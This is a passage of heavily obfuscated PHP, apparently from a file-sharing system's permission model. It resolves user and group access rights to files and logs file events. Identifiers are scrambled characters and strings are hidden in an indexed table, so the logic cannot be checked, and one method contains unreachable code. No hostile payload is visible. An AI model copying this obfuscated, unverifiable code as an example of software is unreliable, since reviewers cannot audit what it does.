$«ïâ»[$ÙÔ¬¯İ¼] = $this->makeSourceAuth($’å¨ö‰ï, $ èª–¨î, $äÜŒâ‚¦); } return $«ïâ»; } public function authDeepCheck($ŠË®ìèÓ, $û‚×êÂì = false) { $ì›š•òÃ =& $_SERVER[ïÃ°£«Ê]; $û‚×êÂì = $û‚×êÂì ? $û‚×êÂì : USER_ID; $ËúŸıÒá = $this->makeAuthDeep($û‚×êÂì); if (!in_array($ŠË®ìèÓ, $ËúŸıÒá[$ì›š•òÃ[2391]])) { return !1; } $Ûò¦¥‰— = array(); foreach ($ËúŸıÒá[$ì›š•òÃ[2392]] as $˜ß¦”¦Ÿ => $ª˜»ø«ş) { if (!in_array($ŠË®ìèÓ, $ª˜»ø«ş)) { continue; } $Ûò¦¥‰—[] = $˜ß¦”¦Ÿ; } if (!$Ûò¦¥‰—) { return !1; } $ïÃÚçà´ = $Ûò¦¥‰— ? $Ûò¦¥‰—[0] : $ŠË®ìèÓ; return array($ì›š•òÃ[503] => -1, $ì›š•òÃ[556] => array($ì›š•òÃ[508] => $ì›š•òÃ[1382], $ì›š•òÃ[2191] => $ì›š•òÃ[228], $ì›š•òÃ[509] => LNG($ì›š•òÃ[2393]), $ì›š•òÃ[2206] => $ì›š•òÃ[2394]), $ì›š•òÃ[2382] => LNG($ì›š•òÃ[2395]), $ì›š•òÃ[2396] => $this->sourceAuthInfo($ïÃÚçà´)); } protected function makeAuthDeep($€¸¸Ìß = false) { $Èíõı÷‚ =& $_SERVER[ïÃ°£«Ê]; static $—œáçÈ¨ = array(); $€¸¸Ìß = $€¸¸Ìß ? $€¸¸Ìß : USER_ID; if (isset($—œáçÈ¨[$€¸¸Ìß])) { return $—œáçÈ¨[$€¸¸Ìß]; } $ÁÚ¹Æ‹‰ = Model($Èíõı÷‚[2397])->listData(); $¿†ÆÆ‚ = array(); foreach ($ÁÚ¹Æ‹‰ as $š×ıöÓí) { if ($š×ıöÓí[$Èíõı÷‚[502]] == 0 && $š×ıöÓí[$Èíõı÷‚[2205]] == $Èíõı÷‚[91]) { $¿†ÆÆ‚[] = $š×ıöÓí[$Èíõı÷‚[487]]; } } $„²Õºğî = $this->userGroupParents($€¸¸Ìß); $ËÉ†»ÌŠ = array($Èíõı÷‚[188] => SourceModel::TYPE_USER, $Èíõı÷‚[589] => $€¸¸Ìß); if ($„²Õºğî) { $ËÉ†»ÌŠ = array(array($Èíõı÷‚[188] => SourceModel::TYPE_USER, $Èíõı÷‚[589] => $€¸¸Ìß), array($Èíõı÷‚[188] => SourceModel::TYPE_GROUP, $Èíõı÷‚[589] => array($Èíõı÷‚[507], $„²Õºğî)), $Èíõı÷‚[1168] => $Èíõı÷‚[2287]); } $€…ØÅº = $this->field($Èíõı÷‚[2398])->where($ËÉ†»ÌŠ)->select(); $Ù€ª§Ôş = array(); $ËâŸ¡ü = array_to_keyvalue_group($€…ØÅº, $Èíõı÷‚[191]); foreach ($ËâŸ¡ü as $Ä¢ÅŠ™¢ => $‡Ÿ†Ï®Ü) { $ûä™ªĞº = $this->authArrayCheck($‡Ÿ†Ï®Ü, $€¸¸Ìß); if ($ûä™ªĞº[$Èíõı÷‚[503]] > 0) { $Ù€ª§Ôş[] = $Ä¢ÅŠ™¢ . $Èíõı÷‚[12]; } } if ($„²Õºğî) { $ÀİË©õì = Model($Èíõı÷‚[605]); foreach ($„²Õºğî as $ªªØÉ†Ç) { $ŒØ˜”ßå = $ÀİË©õì->getInfo($ªªØÉ†Ç); if (!$ŒØ˜”ßå || !is_array($ŒØ˜”ßå[$Èíõı÷‚[90]])) { continue; } $Ù€ª§Ôş[] = $ŒØ˜”ßå[$Èíõı÷‚[90]][$Èíõı÷‚[191]]; } } $Éµ™ĞÒ‹ = array(); $¶å¢­œ§ = $„²Õºğî; $Ù¿œôÍ = Model($Èíõı÷‚[1535]); $ÀİË©õì = Model($Èíõı÷‚[605]); $ÚüƒªÔÖ = array(); $ø´÷ƒ«­ = array(); $¢¢Œ’é› = array(); $µ¬è·õ£ = array(); if ($Ù€ª§Ôş) { $§°ûÎâ = $Ù¿œôÍ->where(array($Èíõı÷‚[191] => array($Èíõı÷‚[507], $Ù€ª§Ôş)))->select(); foreach ($§°ûÎâ as $¿„¨öÉ) { if ($¿„¨öÉ[$Èíõı÷‚[520]] == $Èíõı÷‚[91]) { continue; } $Ù¡úÌÈã = $Ù¿œôÍ->parentLevelArray($¿„¨öÉ[$Èíõı÷‚[604]]); $Éµ™ĞÒ‹ = array_merge($Éµ™ĞÒ‹, $Ù¡úÌÈã); $¶å¢­œ§[] = $¿„¨öÉ[$Èíõı÷‚[589]]; $ÚüƒªÔÖ[$¿„¨öÉ[$Èíõı÷‚[191]]] = $Ù¡úÌÈã; $ø´÷ƒ«­[$¿„¨öÉ[$Èíõı÷‚[191]]] = $¿„¨öÉ[$Èíõı÷‚[589]]; } } $¶å¢­œ§ = array_values(array_unique($¶å¢­œ§)); $´’ĞŞ£Ÿ = $¶å¢­œ§; foreach ($´’ĞŞ£Ÿ as $ªªØÉ†Ç) { $ŒØ˜”ßå = $ÀİË©õì->getInfo($ªªØÉ†Ç); $Ù¡úÌÈã = $Ù¿œôÍ->parentLevelArray($ŒØ˜”ßå[$Èíõı÷‚[604]]); $¶å¢­œ§ = array_merge($¶å¢­œ§, $Ù¡úÌÈã); } $¶å¢­œ§ = array_values(array_unique($¶å¢­œ§)); foreach ($¶å¢­œ§ as $ªªØÉ†Ç) { $ŒØ˜”ßå = $ÀİË©õì->getInfo($ªªØÉ†Ç); $Éµ™ĞÒ‹[] = $ŒØ˜”ßå[$Èíõı÷‚[90]][$Èíõı÷‚[191]]; $¢¢Œ’é›[$ªªØÉ†Ç] = $ŒØ˜”ßå[$Èíõı÷‚[90]][$Èíõı÷‚[191]]; $µ¬è·õ£[$ªªØÉ†Ç] = $Ù¿œôÍ->parentLevelArray($ŒØ˜”ßå[$Èíõı÷‚[604]]); } foreach ($ÚüƒªÔÖ as $àä•á‘› => $°áİ¿×) { $‘Ãµƒé° = $ø´÷ƒ«­[$àä•á‘›]; if (!$‘Ãµƒé° || !$¢¢Œ’é›[$‘Ãµƒé°]) { continue; } $«ºñï§ = array(); foreach ($µ¬è·õ£[$‘Ãµƒé°] as $ªªØÉ†Ç) { $«ºñï§[] = $¢¢Œ’é›[$ªªØÉ†Ç]; } $ÚüƒªÔÖ[$àä•á‘›] = array_merge($«ºñï§, $°áİ¿×); } $Éµ™ĞÒ‹ = array_values(array_unique($Éµ™ĞÒ‹)); $®³—Š‡ = array($Èíõı÷‚[2391] => $Éµ™ĞÒ‹, $Èíõı÷‚[2392] => $ÚüƒªÔÖ); $—œáçÈ¨[$€¸¸Ìß] = $®³—Š‡; return $®³—Š‡; } private function makeSourceAuth($ëŸÈ˜©«, $ñ ÚÂ†è, $ä˜¼„½´ = false) { $±¦åÏ–å =& $_SERVER[ïÃ°£«Ê]; $×ó’İ¦Å = $±¦åÏ–å[91]; $”ÖË»€ì = $ëŸÈ˜©«[$±¦åÏ–å[589]]; $Àíãª¿Ç = $ëŸÈ˜©«[$±¦åÏ–å[188]] == SourceModel::TYPE_GROUP; $·½òœüÏ = $Àíãª¿Ç ? $this->groupRootAuth($”ÖË»€ì, $ä˜¼„½´) : !1; if ($·½òœüÏ && Model($±¦åÏ–å[591])->authCheckAction($·½òœüÏ[$±¦åÏ–å[502]], $±¦åÏ–å[1566])) { return $this->groupAuthInfo($·½òœüÏ, $”ÖË»€ì); } $Ğş‹Î’é = Model($±¦åÏ–å[1535])->parentLevelArray($ëŸÈ˜©«[$±¦åÏ–å[604]]); $Ğş‹Î’é = array_merge(array($ëŸÈ˜©«[$±¦åÏ–å[191]]), array_reverse($Ğş‹Î’é)); $ßÜÊ¼å = !1; foreach ($Ğş‹Î’é as $ÕÈ¢çä) { if (!isset($ñ ÚÂ†è[$ÕÈ¢çä])) { continue; } $»ÒÃ’·» = $this->authMake($ñ ÚÂ†è[$ÕÈ¢çä], $ä˜¼„½´); if ($»ÒÃ’·»[$±¦åÏ–å[556]]) { $ßÜÊ¼å = $»ÒÃ’·»; break; } } if (!$Àíãª¿Ç) { return $ßÜÊ¼å; } if (!$ßÜÊ¼å && $·½òœüÏ) { $ßÜÊ¼å = $this->groupAuthInfo($·½òœüÏ, $”ÖË»€ì); } if (!$ßÜÊ¼å) { $±¿ƒ©÷Ç = Model($±¦åÏ–å[605])->getInfo($”ÖË»€ì); $¸‡É‡– = explode($±¦åÏ–å[50], trim($±¿ƒ©÷Ç[$±¦åÏ–å[604]], $±¦åÏ–å[50])); $¸‡É‡– = array_reverse($¸‡É‡–); foreach ($¸‡É‡– as $şÅò§¹ú) { if ($şÅò§¹ú == $±¦åÏ–å[228] || $şÅò§¹ú == $×ó’İ¦Å) { continue; } $®¥¯â¼§ = $this->groupRootAuth($şÅò§¹ú, $ä˜¼„½´); if (!$®¥¯â¼§) { continue; } $ßÜÊ¼å = $this->groupAuthInfo($®¥¯â¼§, $şÅò§¹ú); break; } } if (!$ßÜÊ¼å || $ßÜÊ¼å[$±¦åÏ–å[503]] <= 0) { $¶Ì†‡Ã¶ = $this->authDeepCheck($ëŸÈ˜©«[$±¦åÏ–å[191]], $ä˜¼„½´); if ($¶Ì†‡Ã¶) { $ßÜÊ¼å = $¶Ì†‡Ã¶; } } return $ßÜÊ¼å; } private function userIsRoot($Â“š½ÒÔ = false) { $ıƒöö÷É =& $_SERVER[ïÃ°£«Ê]; if (!$Â“š½ÒÔ && KodUser::isRoot()) { return !0; } $ÚÁşç’ = Model($ıƒöö÷É[617])->getInfo($Â“š½ÒÔ); $¡ÁË»›ã = Model($ıƒöö÷É[2375])->listData($ÚÁşç’[$ıƒöö÷É[2376]]); if ($¡ÁË»›ã && $¡ÁË»›ã[$ıƒöö÷É[595]][$ıƒöö÷É[2379]] == 1) { return !0; } return !1; } private function sourceAuthInfo($â¤Ã§êÇ) { $àíí›ã£ =& $_SERVER[ïÃ°£«Ê]; $Ù¤‡èò = Model($àíí›ã£[1535]); $õ¿½¶êÕ = $Ù¤‡èò->sourceInfo($â¤Ã§êÇ); if (!$õ¿½¶êÕ) { return !1; } $Ù¤‡èò->groupPathDisplay($õ¿½¶êÕ); $ñòİêıÂ = array($õ¿½¶êÕ); $ñòİêıÂ = $Ù¤‡èò->_listAppendPath($ñòİêıÂ, !1); $õ¿½¶êÕ = $ñòİêıÂ[0]; $”¯æœÜû = $õ¿½¶êÕ[$àíí›ã£[602]]; if (isset($õ¿½¶êÕ[$àíí›ã£[610]])) { $úÎÃùó± = explode($àíí›ã£[8], trim($õ¿½¶êÕ[$àíí›ã£[602]], $àíí›ã£[8])); array_shift($úÎÃùó±); $”¯æœÜû = $õ¿½¶êÕ[$àíí›ã£[608]] . $àíí›ã£[2399] . implode($àíí›ã£[8], $úÎÃùó±); } return array($àíí›ã£[32] => $õ¿½¶êÕ[$àíí›ã£[32]], $àíí›ã£[191] => $õ¿½¶êÕ[$àíí›ã£[191]], $àíí›ã£[87] => KodIO::make($õ¿½¶êÕ[$àíí›ã£[191]]), $àíí›ã£[602] => $”¯æœÜû); } private function groupAuthInfo($•–óá¶¢, $Û¶ö¿…¯) { $©áĞ…Ë =& $_SERVER[ïÃ°£«Ê]; $“†ªøÛ = Model($©áĞ…Ë[605])->getInfo($Û¶ö¿…¯); return array($©áĞ…Ë[2400] => intval($•–óá¶¢[$©áĞ…Ë[502]]), $©áĞ…Ë[2390] => $•–óá¶¢, $©áĞ…Ë[2401] => LNG($©áĞ…Ë[2402]), $©áĞ…Ë[2396] => array($©áĞ…Ë[509] => $“†ªøÛ[$©áĞ…Ë[32]], $©áĞ…Ë[87] => KodIO::make($“†ªøÛ[$©áĞ…Ë[90]][$©áĞ…Ë[191]]), $©áĞ…Ë[2403] => $“†ªøÛ[$©áĞ…Ë[609]])); } protected function groupRootAuth($©Ê³úÔ², $Õ¯€à³ = false) { $éúÆÆßô =& $_SERVER[ïÃ°£«Ê]; $Õ¯€à³ = $Õ¯€à³ ? $Õ¯€à³ : USER_ID; $‘¯‘€ë² = $Õ¯€à³ . $éúÆÆßô[2404] . $©Ê³úÔ²; static $Ûæ®¨±Ï = array(); if (isset($Ûæ®¨±Ï[$‘¯‘€ë²])) { return $Ûæ®¨±Ï[$‘¯‘€ë²]; } $®ôº¤°Ş = Model($éúÆÆßô[605])->getInfo($©Ê³úÔ²); $¾æ‹×é˜ = $this->userGroupList($Õ¯€à³); $¸¥Õ•Òœ = isset($¾æ‹×é˜[$©Ê³úÔ²]) ? $¾æ‹×é˜[$©Ê³úÔ²][$éúÆÆßô[502]] : !1; if ($¸¥Õ•Òœ && Model($éúÆÆßô[591])->authCheckAction($¸¥Õ•Òœ[$éúÆÆßô[502]], $éúÆÆßô[1566])) { $Ûæ®¨±Ï[$‘¯‘€ë²] = $¸¥Õ•Òœ; return $¸¥Õ•Òœ; } $Ì²ûÉœ¶ = $this->sourceAuthSelect($®ôº¤°Ş[$éúÆÆßô[90]][$éúÆÆßô[191]]); $Ôûë€ô‚ = $Ì²ûÉœ¶ ? $this->authMake($Ì²ûÉœ¶, $Õ¯€à³) : !1; $Ä“ùšêÄ = $Ôûë€ô‚ ? $Ôûë€ô‚[$éúÆÆßô[556]] : !1; $Ûæ®¨±Ï[$‘¯‘€ë²] = $Ä“ùšêÄ ? $Ä“ùšêÄ : $¸¥Õ•Òœ; return $Ûæ®¨±Ï[$‘¯‘€ë²]; } public function authOwnerApply($€Ş’ãšŒ) { $€œ¯üñ =& $_SERVER[ïÃ°£«Ê]; if (empty($€Ş’ãšŒ[$€œ¯üñ[502]]) || isset($€Ş’ãšŒ[$€œ¯üñ[1585]]) && $€Ş’ãšŒ[$€œ¯üñ[1585]]) { return $€Ş’ãšŒ; } if (AuthModel::authCheckRoot($€Ş’ãšŒ[$€œ¯üñ[502]][$€œ¯üñ[503]])) { return $€Ş’ãšŒ; } $ªıı¼À¤ = Model($€œ¯üñ[1535])->parentLevelArray($€Ş’ãšŒ[$€œ¯üñ[604]]); $ªıı¼À¤ = array_merge(array($€Ş’ãšŒ[$€œ¯üñ[191]]), array_reverse($ªıı¼À¤)); $©ÕÓÛõı = $this->sourceAuthSelect($ªıı¼À¤); $İäêü©ø = array(); $ç“æÇªÙ = array(); foreach ($©ÕÓÛõı as $†‘™Åè => $Ş»ş¾‘) { $ùâ­…âş = $this->authFolderOwnerUser($Ş»ş¾‘); $İäêü©ø[$†‘™Åè] = $ùâ­…âş; $ç“æÇªÙ = array_merge($ç“æÇªÙ, $ùâ­…âş[$€œ¯üñ[684]]); if ($ùâ­…âş[$€œ¯üñ[2405]]) { break; } } if (count($ç“æÇªÙ) == 0) { $ç“æÇªÙ = $this->authFolderOwnerGroup($€Ş’ãšŒ[$€œ¯üñ[589]]); } $ç“æÇªÙ = array_unique($ç“æÇªÙ); if (AuthModel::authCheckRoot($€Ş’ãšŒ[$€œ¯üñ[502]][$€œ¯üñ[503]])) { $ç“æÇªÙ[] = USER_ID; } $€Ş’ãšŒ[$€œ¯üñ[502]][$€œ¯üñ[2406]] = Model($€œ¯üñ[597])->userListInfo($ç“æÇªÙ); return $€Ş’ãšŒ; } private function authFolderOwnerGroup($€¢šƒ°š) { $’•ôÅ˜ =& $_SERVER[ïÃ°£«Ê]; $¬ù—”–¤ = Model($’•ôÅ˜[2279])->where(array($’•ôÅ˜[1497] => $€¢šƒ°š))->select(); $Ïïø†¬ò = array(); if (!$¬ù—”–¤) { return $Ïïø†¬ò; } foreach ($¬ù—”–¤ as $Á…ç÷¤›) { $Ô¦¥€Ÿõ = $this->authInfo($Á…ç÷¤›); if (AuthModel::authCheckRoot($Ô¦¥€Ÿõ[$’•ôÅ˜[502]])) { $Ïïø†¬ò[] = $Á…ç÷¤›[$’•ôÅ˜[1594]]; } } return $Ïïø†¬ò; } private function authFolderOwnerUser($µªùÀ‚) { $ış˜òÙ« =& $_SERVER[ïÃ°£«Ê]; $±ÄäÓ“İ = array(); $•¢ñğØœ = !1; foreach ($µªùÀ‚ as $ø§…äş›) { $…ÇÔ‡Áı = $this->authInfo($ø§…äş›); if ($ø§…äş›[$ış˜òÙ«[589]] == $ış˜òÙ«[228]) { $•¢ñğØœ = !0; } if ($ø§…äş›[$ış˜òÙ«[188]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($…ÇÔ‡Áı[$ış˜òÙ«[502]])) { $±ÄäÓ“İ[] = $ø§…äş›[$ış˜òÙ«[589]]; } } } return array($ış˜òÙ«[684] => $±ÄäÓ“İ, $ış˜òÙ«[2405] => $•¢ñğØœ); } public function authMake($¥éñšä¤, $áëıı¦Ó = false) { $³•ÀŸœğ =& $_SERVER[ïÃ°£«Ê]; $„éàÀç = $this->authArrayCheck($¥éñšä¤, $áëıı¦Ó); if ($„éàÀç[$³•ÀŸœğ[2386]]) { $„éàÀç[$³•ÀŸœğ[2386]] = $this->sourceAuthInfo($„éàÀç[$³•ÀŸœğ[2386]]); } return $„éàÀç; } public function authArrayCheck($£Â§ê­¸, $¶ÜºÜË‚ = false) { $ƒ¤×Ú¤Ú =& $_SERVER[ïÃ°£«Ê]; if (!$£Â§ê­¸) { return array($ƒ¤×Ú¤Ú[503] => 0, $ƒ¤×Ú¤Ú[556] => !1, $ƒ¤×Ú¤Ú[2401] => $ƒ¤×Ú¤Ú[12]); } $¶ÜºÜË‚ = $¶ÜºÜË‚ ? $¶ÜºÜË‚ : USER_ID; $êÀí¸Şå = 0; $ß¥ÑÈİ = 0; $ÈœŞæáº = 0; $¥…ßÀ•Ÿ = 0; $ÃøúÅªï = 0; $¢è©Š¨º = 0; $‡Ø³Ÿ‹ˆ = 0; $«úˆ˜° = 0; $£Ü¶×­Ñ = 1000; $±½à™ßœ = 0; $šÓ‘ƒ¼— = 0; $—ÜÍæâ² = 0; $©âø«² = 0; $¢å©İŸ = 0; foreach ($£Â§ê­¸ as $èêÓÌ‚) { $Üå…÷á¤ = $this->authInfo($èêÓÌ‚); if (!$Üå…÷á¤) { continue; } $Í¤÷£Îó = $èêÓÌ‚[$ƒ¤×Ú¤Ú[589]]; $é¿—¥Í = $èêÓÌ‚[$ƒ¤×Ú¤Ú[191]]; $Èª¼»–È = intval($Üå…÷á¤[$ƒ¤×Ú¤Ú[502]]); if ($èêÓÌ‚[$ƒ¤×Ú¤Ú[188]] == SourceModel::TYPE_USER && $Í¤÷£Îó == $¶ÜºÜË‚) { $êÀí¸Şå = !0; $ÈœŞæáº = $Üå…÷á¤; $ß¥ÑÈİ = $Èª¼»–È; $¥…ßÀ•Ÿ = $é¿—¥Í; } else { if ($èêÓÌ‚[$ƒ¤×Ú¤Ú[188]] == SourceModel::TYPE_GROUP && $this->groupContainUser($Í¤÷£Îó, $¶ÜºÜË‚)) { $ÃøúÅªï = !0; $ô÷­Œ¯š = $this->groupStepToUserGroup($Í¤÷£Îó, $¶ÜºÜË‚); if ($ô÷­Œ¯š < $£Ü¶×­Ñ) { $£Ü¶×­Ñ = $ô÷­Œ¯š; $¢è©Š¨º = $Èª¼»–È; $‡Ø³Ÿ‹ˆ = $Üå…÷á¤; $±½à™ßœ = $Í¤÷£Îó; $«úˆ˜° = $é¿—¥Í; } if ($ô÷­Œ¯š == $£Ü¶×­Ñ && $Èª¼»–È >= $¢è©Š¨º) { $¢è©Š¨º = $Èª¼»–È; $‡Ø³Ÿ‹ˆ = $Üå…÷á¤; $±½à™ßœ = $Í¤÷£Îó; $«úˆ˜° = $é¿—¥Í; } } else { if (!$Í¤÷£Îó || $Í¤÷£Îó == $ƒ¤×Ú¤Ú[228]) { $šÓ‘ƒ¼— = !0; $©âø«² = $Üå…÷á¤; $—ÜÍæâ² = $Èª¼»–È; $¢å©İŸ = $é¿—¥Í; } } } } if ($êÀí¸Şå) { $°šÄÀ«è = $ß¥ÑÈİ; $Üå…÷á¤ = $ÈœŞæáº; $Í”İµ„™ = $¥…ßÀ•Ÿ; $©Ê‰Ø¤¼ = LNG($ƒ¤×Ú¤Ú[2407]); } else { if ($ÃøúÅªï) { $°šÄÀ«è = $¢è©Š¨º; $Üå…÷á¤ = $‡Ø³Ÿ‹ˆ; $Í”İµ„™ = $«úˆ˜°; $âÉùĞŞø = Model($ƒ¤×Ú¤Ú[605])->getInfo($±½à™ßœ); $©Ê‰Ø¤¼ = $ƒ¤×Ú¤Ú[173] . $âÉùĞŞø[$ƒ¤×Ú¤Ú[609]] . $ƒ¤×Ú¤Ú[2408] . LNG($ƒ¤×Ú¤Ú[2409]); } else { if ($šÓ‘ƒ¼—) { $°šÄÀ«è = $—ÜÍæâ²; $Üå…÷á¤ = $©âø«²; $Í”İµ„™ = $¢å©İŸ; $©Ê‰Ø¤¼ = LNG($ƒ¤×Ú¤Ú[2388]); } else { $°šÄÀ«è = 0; $Üå…÷á¤ = !1; $©Ê‰Ø¤¼ = $ƒ¤×Ú¤Ú[12]; $Í”İµ„™ = $ƒ¤×Ú¤Ú[12]; } } } $¥Øíì‰ = array($ƒ¤×Ú¤Ú[2400] => intval($°šÄÀ«è), $ƒ¤×Ú¤Ú[2390] => $Üå…÷á¤, $ƒ¤×Ú¤Ú[2401] => $©Ê‰Ø¤¼, $ƒ¤×Ú¤Ú[2396] => $Í”İµ„™); return $¥Øíì‰; } private function groupContainUser($¸¯¬³, $¹ûÉşä = false) { return in_array($¸¯¬³, $this->userGroupParents($¹ûÉşä)); } private function groupStepToUserGroup($×¯ß°ú, $µìÆœÙ¯ = false) { $Ê´ –È =& $_SERVER[ïÃ°£«Ê]; $ÔÄ„øÇ = $this->userGroupList($µìÆœÙ¯); $£ñÑòÉğ = 1000; $â¶ÉÜü = $GLOBALS[$Ê´ –È[6]][$Ê´ –È[92]][$Ê´ –È[2292]] == 1; $±üÍùÚ§ = $â¶ÉÜü ? 3 : 2; foreach ($ÔÄ„øÇ as $¶ô°‡Ñ) { if ($¶ô°‡Ñ[$Ê´ –È[1497]] == $×¯ß°ú) { return 0; } $è…å©è£ = explode($Ê´ –È[50], trim($¶ô°‡Ñ[$Ê´ –È[604]], $Ê´ –È[50])); if ($è…å©è£[0] == $Ê´ –È[228] && count($è…å©è£) > $±üÍùÚ§) { $Ú¬¯§õÊ = array_reverse(array_slice($è…å©è£, $±üÍùÚ§)); $ôôÛ®È¦ = array_search($×¯ß°ú, $Ú¬¯§õÊ); if ($ôôÛ®È¦ !== !1 && $ôôÛ®È¦ + 1 <= $£ñÑòÉğ) { $£ñÑòÉğ = $ôôÛ®È¦ + 1; } } } return $£ñÑòÉğ; } private function userGroupList($®æàÇÆ  = false, $Úæ‚ƒËµ = false) { $—˜ÕòÃ¨ =& $_SERVER[ïÃ°£«Ê]; static $âãÍ·ğ‰ = array(); if (isset($âãÍ·ğ‰[$®æàÇÆ ])) { return $âãÍ·ğ‰[$®æàÇÆ ]; } if (!$Úæ‚ƒËµ) { $Úæ‚ƒËµ = Model($—˜ÕòÃ¨[617])->getInfo($®æàÇÆ ); } $âãÍ·ğ‰[$®æàÇÆ ] = array_to_keyvalue($Úæ‚ƒËµ[$—˜ÕòÃ¨[1496]], $—˜ÕòÃ¨[1497]); return $âãÍ·ğ‰[$®æàÇÆ ]; } public function userGroupParents($ºè¨®ÑÁ) { $°æ÷™²é =& $_SERVER[ïÃ°£«Ê]; static $÷ãá“ı = array(); $ºè¨®ÑÁ = $ºè¨®ÑÁ ? $ºè¨®ÑÁ : USER_ID; if (isset($÷ãá“ı[$ºè¨®ÑÁ])) { return $÷ãá“ı[$ºè¨®ÑÁ]; } $¿­¯Ğ×— = $this->userGroupList($ºè¨®ÑÁ); $şŞ¢‰á = array(); $ñ€ĞµùÏ = $GLOBALS[$°æ÷™²é[6]][$°æ÷™²é[92]][$°æ÷™²é[2292]] == 1; $ŠïöÉ‰æ = $ñ€ĞµùÏ ? 3 : 2; foreach ($¿­¯Ğ×— as $±Ëˆ¸–Ó) { $ö¯Û¯ù = array($±Ëˆ¸–Ó[$°æ÷™²é[1497]]); $áÑ•¨÷¤ = explode($°æ÷™²é[50], trim($±Ëˆ¸–Ó[$°æ÷™²é[604]], $°æ÷™²é[50])); if ($áÑ•¨÷¤[0] == $°æ÷™²é[228] && count($áÑ•¨÷¤) > $ŠïöÉ‰æ) { $™ÔİÒÅõ = array_slice($áÑ•¨÷¤, $ŠïöÉ‰æ); $ö¯Û¯ù = array_merge($ö¯Û¯ù, array_reverse($™ÔİÒÅõ)); } $şŞ¢‰á = array_merge($şŞ¢‰á, $ö¯Û¯ù); } $÷ãá“ı[$ºè¨®ÑÁ] = array_unique($şŞ¢‰á); return $÷ãá“ı[$ºè¨®ÑÁ]; } public function authTargetInfoMake($ÉöŸŠ¯Ã) { $„ò’î­„ =& $_SERVER[ïÃ°£«Ê]; $š¸Ëöç‚ = array(); $¶çİÈ†ã = array(); foreach ($ÉöŸŠ¯Ã as $²¬ÍÕµ) { if ($²¬ÍÕµ[$„ò’î­„[188]] == SourceModel::TYPE_USER) { $š¸Ëöç‚[] = intval($²¬ÍÕµ[$„ò’î­„[589]]); } else { if ($²¬ÍÕµ[$„ò’î­„[188]] == SourceModel::TYPE_GROUP) { $¶çİÈ†ã[] = intval($²¬ÍÕµ[$„ò’î­„[589]]); } } } if ($š¸Ëöç‚) { $š¸Ëöç‚ = Model($„ò’î­„[597])->userListInfo($š¸Ëöç‚); } if ($¶çİÈ†ã) { $¤ß¡–Ş’ = array($„ò’î­„[2272] => array($„ò’î­„[507], $¶çİÈ†ã)); $¶çİÈ†ã = Model($„ò’î­„[605])->field($„ò’î­„[2410])->where($¤ß¡–Ş’)->select(); $¶çİÈ†ã = array_to_keyvalue($¶çİÈ†ã, $„ò’î­„[1497]); } return array($„ò’î­„[2411] => $š¸Ëöç‚, $„ò’î­„[2412] => $¶çİÈ†ã); } public function authInfo($ûû·Ò²’) { $ îÓÁÒ =& $_SERVER[ïÃ°£«Ê]; if ($ûû·Ò²’[$ îÓÁÒ[1642]]) { $§Ú¬ÅŸ = Model($ îÓÁÒ[591])->listData($ûû·Ò²’[$ îÓÁÒ[1642]]); if (!$§Ú¬ÅŸ) { return !1; $Õï™û½á = Model($ îÓÁÒ[591])->listData(); $ğ¾Ş»‚Ì = array_filter_by_field($Õï™û½á, $ îÓÁÒ[502], $ îÓÁÒ[228]); return $ğ¾Ş»‚Ì; } $ù™ßñËè = array_field_key($§Ú¬ÅŸ, array($ îÓÁÒ[487], $ îÓÁÒ[32], $ îÓÁÒ[502], $ îÓÁÒ[2206], $ îÓÁÒ[2207])); $ù™ßñËè[$ îÓÁÒ[2413]] = $ûû·Ò²’; return $ù™ßñËè; } else { return array($ îÓÁÒ[508] => 0, $ îÓÁÒ[2191] => $ûû·Ò²’[$ îÓÁÒ[2348]], $ îÓÁÒ[509] => $ îÓÁÒ[12], $ îÓÁÒ[2206] => $ îÓÁÒ[2414]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\x75\x72\x63\x65\137\x65\x76\x65\x6e\164"; protected $dataAuto = array(array("\x63\162\x65\141\x74\145\x54\x69\155\145", "\x74\151\x6d\145", "\x69\x6e\x73\145\162\x74", "\146\165\x6e\x63\164\151\157\x6e"), array("\144\145\x73\143", '', "\151\x6e\163\145\162\164\54\x75\160\x64\x61\164\x65\54\163\145\x6c\145\x63\164", "\152\x73\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($¦±˜çÜ±, $†’îÈÑ“, $úé”íÑ’ = '') { $¡ãØ«÷ =& $_SERVER[ïÃ°£«Ê]; if (!$this->eventSave) { return; } $å¸Ü³Á = Model($¡ãØ«÷[1535])->sourceInfo($¦±˜çÜ±); if (!$å¸Ü³Á) { return !1; } if ($this->isDisableEvent($å¸Ü³Á, $†’îÈÑ“)) { return; } if ($úé”íÑ’ && is_string($úé”íÑ’)) { $úé”íÑ’ = array($¡ãØ«÷[2225] => $úé”íÑ’); } $„ ‰ˆí¸ = KodUser::id(); $ı·Ñ´°ò = array($¡ãØ«÷[506] => $¦±˜çÜ±, $¡ãØ«÷[2415] => $å¸Ü³Á[$¡ãØ«÷[190]], $¡ãØ«÷[2416] => $å¸Ü³Á[$¡ãØ«÷[32]], $¡ãØ«÷[602] => !empty($å¸Ü³Á[$¡ãØ«÷[602]]) ? $å¸Ü³Á[$¡ãØ«÷[602]] : $¡ãØ«÷[12], $¡ãØ«÷[1971] => $„ ‰ˆí¸, $¡ãØ«÷[511] => $†’îÈÑ“, $¡ãØ«÷[1973] => $úé”íÑ’); $this->addSystemLog($†’îÈÑ“, $ı·Ñ´°ò); unset($ı·Ñ´°ò[$¡ãØ«÷[2416]], $ı·Ñ´°ò[$¡ãØ«÷[602]]); return $this->add($ı·Ñ´°ò); } private function addSystemLog($Õşñ§‚Œ, $Ö½ÖìİÃ) { $ÌÄ¤Å£â =& $_SERVER[ïÃ°£«Ê]; if ($Õşñ§‚Œ == $ÌÄ¤Å£â[2417]) { $Õşñ§‚Œ = $Ö½ÖìİÃ[$ÌÄ¤Å£â[540]][$ÌÄ¤Å£â[2418]]; } else { if (in_array($Õşñ§‚Œ, array($ÌÄ¤Å£â[1564], $ÌÄ¤Å£â[2419]))) { $Õşñ§‚Œ = $Ö½ÖìİÃ[$ÌÄ¤Å£â[540]][$ÌÄ¤Å£â[168]]; } } $ì‹ æöÃ = array_merge($Ö½ÖìİÃ, array($ÌÄ¤Å£â[2420] => $Ö½ÖìİÃ[$ÌÄ¤Å£â[191]], $ÌÄ¤Å£â[2421] => $Ö½ÖìİÃ[$ÌÄ¤Å£â[2421]])); Hook::trigger($ÌÄ¤Å£â[2422], $ÌÄ¤Å£â[2423] . $Õşñ§‚Œ, 